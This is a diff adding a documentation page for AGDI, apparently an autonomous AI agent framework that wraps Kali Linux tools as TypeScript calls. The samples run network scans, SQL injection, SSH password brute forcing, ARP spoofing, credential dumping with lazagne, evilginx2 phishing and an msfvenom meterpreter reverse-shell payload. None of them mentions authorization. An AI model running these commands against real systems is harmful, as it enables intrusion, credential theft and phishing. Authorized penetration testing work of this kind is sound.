@@ -1,0 +1,140 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Kali Linux Tools — AGDI Docs</title>
+  <meta name="description" content="Programmatic access to 100+ Kali Linux tools across 11 categories.">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="/assets/docs.css">
+</head>
+<body>
+  <nav class="topbar">
+    <a href="/" class="logo">⚡ AGDI</a>
+    <span class="topbar-title">Documentation</span>
+    <a href="https://agdi-ai.vercel.app" class="back-link">← Back to site</a>
+  </nav>
+  <div class="layout">
+    <aside class="sidebar"><div class="sidebar-tabs"><a class="tab" href="/index.html">Get started</a><a class="tab" href="/install/index.html">Install</a><a class="tab" href="/channels/index.html">Channels</a><a class="tab" href="/concepts/architecture.html">Agents</a><a class="tab active" href="/autonomous/index.html">Autonomous</a><a class="tab" href="/tools/index.html">Tools</a><a class="tab" href="/providers/index.html">Models</a><a class="tab" href="/platforms/index.html">Platforms</a><a class="tab" href="/gateway/index.html">Gateway & Ops</a><a class="tab" href="/cli/index.html">Reference</a><a class="tab" href="/help/index.html">Help</a></div><div class="sidebar-group"><h4>Overview</h4><ul><li><a class="" href="/autonomous/index.html">Autonomous Agent</a></li></ul></div><div class="sidebar-group"><h4>Device Control</h4><ul><li><a class="" href="/autonomous/device-control.html">Device Control</a></li></ul></div><div class="sidebar-group"><h4>Security Suite</h4><ul><li><a class="" href="/autonomous/security/index.html">Security Suite</a></li><li><a class="" href="/autonomous/security/network-recon.html">Network Recon</a></li><li><a class="" href="/autonomous/security/web-scanner.html">Web Scanner</a></li><li><a class="" href="/autonomous/security/wifi.html">WiFi Security</a></li><li><a class="" href="/autonomous/security/crypto.html">Crypto Toolkit</a></li><li><a class="" href="/autonomous/security/exploits.html">Exploit Engine</a></li><li><a class="" href="/autonomous/security/packets.html">Packet Sniffer</a></li><li><a class="active" href="/autonomous/security/kali.html">Kali Linux Tools</a></li></ul></div><div class="sidebar-group"><h4>Automation</h4><ul><li><a class="" href="/autonomous/workflows.html">Workflows & Automation</a></li><li><a class="" href="/autonomous/delegation.html">AI-to-AI Delegation</a></li></ul></div><div class="sidebar-group"><h4>Security Hardening</h4><ul><li><a class="" href="/autonomous/security-hardening.html">Security Hardening</a></li></ul></div></aside>
+    <main class="content">
+      <article class="prose"><h1>Kali Linux Tools</h1>
+<p>AGDI wraps 100+ Kali Linux tools as callable TypeScript functions, organized into 11 categories.</p>
+<h2>Categories</h2>
+<h3>🔍 Information Gathering</h3>
+<pre><code class="language-typescript">import { InfoGathering } from &quot;agdi/autonomous&quot;;
+
+await InfoGathering.nmap(&quot;10.0.0.1&quot;, &quot;-sV&quot;, &quot;-O&quot;);
+await InfoGathering.masscan(&quot;10.0.0.0/24&quot;, &quot;1-65535&quot;, &quot;10000&quot;);
+await InfoGathering.theHarvester(&quot;target.com&quot;, &quot;all&quot;);
+await InfoGathering.amass(&quot;target.com&quot;);
+await InfoGathering.sublister(&quot;target.com&quot;);
+await InfoGathering.whois(&quot;target.com&quot;);
+await InfoGathering.enum4linux(&quot;10.0.0.5&quot;);
+await InfoGathering.snmpwalk(&quot;10.0.0.1&quot;);
+await InfoGathering.wafw00f(&quot;https://target.com&quot;);
+</code></pre>
+<h3>🛡️ Vulnerability Analysis</h3>
+<pre><code class="language-typescript">import { VulnAnalysis } from &quot;agdi/autonomous&quot;;
+
+await VulnAnalysis.nikto(&quot;https://target.com&quot;);
+await VulnAnalysis.wpscan(&quot;https://wordpress-site.com&quot;);
+await VulnAnalysis.nmapVuln(&quot;10.0.0.5&quot;);
+await VulnAnalysis.lynis();
+</code></pre>
+<h3>🕷️ Web Application Attacks</h3>
+<pre><code class="language-typescript">import { WebAttacks } from &quot;agdi/autonomous&quot;;
+
+await WebAttacks.sqlmap(&quot;https://target.com/page?id=1&quot;, &quot;--dbs&quot;);
+await WebAttacks.gobuster(&quot;https://target.com&quot;, &quot;/usr/share/wordlists/dirb/big.txt&quot;);
+await WebAttacks.ffuf(&quot;https://target.com&quot;, &quot;/usr/share/seclists/Discovery/Web-Content/common.txt&quot;);
+await WebAttacks.whatweb(&quot;https://target.com&quot;);
+await WebAttacks.sslyze(&quot;target.com&quot;);
+</code></pre>
+<h3>🔑 Password Attacks</h3>
+<pre><code class="language-typescript">import { PasswordAttacks } from &quot;agdi/autonomous&quot;;
+
+await PasswordAttacks.hydra(&quot;10.0.0.5&quot;, &quot;ssh&quot;, &quot;users.txt&quot;, &quot;rockyou.txt&quot;);
+await PasswordAttacks.hashcat(&quot;hash&quot;, &quot;0&quot;, &quot;rockyou.txt&quot;);
+await PasswordAttacks.john(&quot;hashes.txt&quot;);
+await PasswordAttacks.cewl(&quot;https://target.com&quot;);
+</code></pre>
+<h3>📶 Wireless Attacks</h3>
+<pre><code class="language-typescript">import { WirelessAttacks } from &quot;agdi/autonomous&quot;;
+
+await WirelessAttacks.airmonNg(&quot;start&quot;, &quot;wlan0&quot;);
+await WirelessAttacks.airodumpNg(&quot;wlan0mon&quot;);
+await WirelessAttacks.wifite();
+await WirelessAttacks.bettercap(&quot;-iface&quot;, &quot;wlan0mon&quot;);
+</code></pre>
+<h3>💣 Exploitation</h3>
+<pre><code class="language-typescript">import { Exploitation } from &quot;agdi/autonomous&quot;;
+
+await Exploitation.msfconsole(&quot;exploit.rc&quot;);
+await Exploitation.msfvenom(&quot;-p&quot;, &quot;linux/x64/meterpreter/reverse_tcp&quot;, &quot;LHOST=10.0.0.1&quot;, &quot;LPORT=4444&quot;, &quot;-f&quot;, &quot;elf&quot;, &quot;-o&quot;, &quot;payload&quot;);
+await Exploitation.searchsploit(&quot;apache 2.4&quot;);
+await Exploitation.crackmapexec(&quot;smb&quot;, &quot;10.0.0.0/24&quot;, &quot;-u&quot;, &quot;admin&quot;, &quot;-p&quot;, &quot;password&quot;);
+</code></pre>
+<h3>📡 Sniffing &amp; Spoofing</h3>
+<pre><code class="language-typescript">import { SniffSpoof } from &quot;agdi/autonomous&quot;;
+
+await SniffSpoof.tcpdump(&quot;eth0&quot;, &quot;port 80&quot;);
+await SniffSpoof.tshark(&quot;eth0&quot;, &quot;-Y&quot;, &quot;http&quot;);
+await SniffSpoof.arpspoof(&quot;eth0&quot;, &quot;10.0.0.5&quot;, &quot;10.0.0.1&quot;);
+await SniffSpoof.responder(&quot;eth0&quot;);
+await SniffSpoof.mitmproxy(&quot;8080&quot;);
+await SniffSpoof.macchanger(&quot;eth0&quot;, &quot;-r&quot;);
+</code></pre>
+<h3>🏴‍☠️ Post-Exploitation</h3>
+<pre><code class="language-typescript">import { PostExploitation } from &quot;agdi/autonomous&quot;;
+
+await PostExploitation.linpeas();
+await PostExploitation.lazagne();
+await PostExploitation.proxychains(&quot;nmap&quot;, &quot;-sT&quot;, &quot;10.0.0.5&quot;);
+</code></pre>
+<h3>🔬 Forensics</h3>
+<pre><code class="language-typescript">import { Forensics } from &quot;agdi/autonomous&quot;;
+
+await Forensics.binwalk(&quot;firmware.bin&quot;);
+await Forensics.exiftool(&quot;image.jpg&quot;);
+await Forensics.steghide(&quot;image.jpg&quot;, &quot;password&quot;);
+await Forensics.volatility(&quot;memory.dmp&quot;, &quot;Win10x64&quot;, &quot;pslist&quot;);
+</code></pre>
+<h3>⚙️ Reverse Engineering</h3>
+<pre><code class="language-typescript">import { ReverseEngineering } from &quot;agdi/autonomous&quot;;
+
+await ReverseEngineering.radare2(&quot;binary&quot;, &quot;aaa&quot;, &quot;afl&quot;);
+await ReverseEngineering.objdump(&quot;binary&quot;);
+await ReverseEngineering.apktool(&quot;app.apk&quot;);
+await ReverseEngineering.jadx(&quot;app.apk&quot;);
+</code></pre>
+<h3>🎭 Social Engineering</h3>
+<pre><code class="language-typescript">import { SocialEngineering } from &quot;agdi/autonomous&quot;;
+
+await SocialEngineering.gophish();
+await SocialEngineering.evilginx2();
+</code></pre>
+<h2>Audit Your Arsenal</h2>
+<pre><code class="language-typescript">import { auditKaliTools } from &quot;agdi/autonomous&quot;;
+
+const audit = await auditKaliTools();
+console.log(`✅ ${audit.installed.length}/${audit.total} tools installed`);
+console.log(&quot;❌ Missing:&quot;, audit.missing.join(&quot;, &quot;));
+</code></pre>
+<h2>Run Any Tool Directly</h2>
+<pre><code class="language-typescript">import { runTool } from &quot;agdi/autonomous&quot;;
+
+const result = await runTool(&quot;nmap&quot;, [&quot;-sV&quot;, &quot;-p&quot;, &quot;80,443&quot;, &quot;10.0.0.1&quot;]);
+console.log(result.stdout);
+</code></pre>
+</article>
+    </main>
+  </div>
+  <script>
+    // Mobile sidebar toggle
+    document.querySelector('.topbar-title')?.addEventListener('click', () => {
+      document.querySelector('.sidebar')?.classList.toggle('open');
+    });
+  </script>
+</body>
+</html>
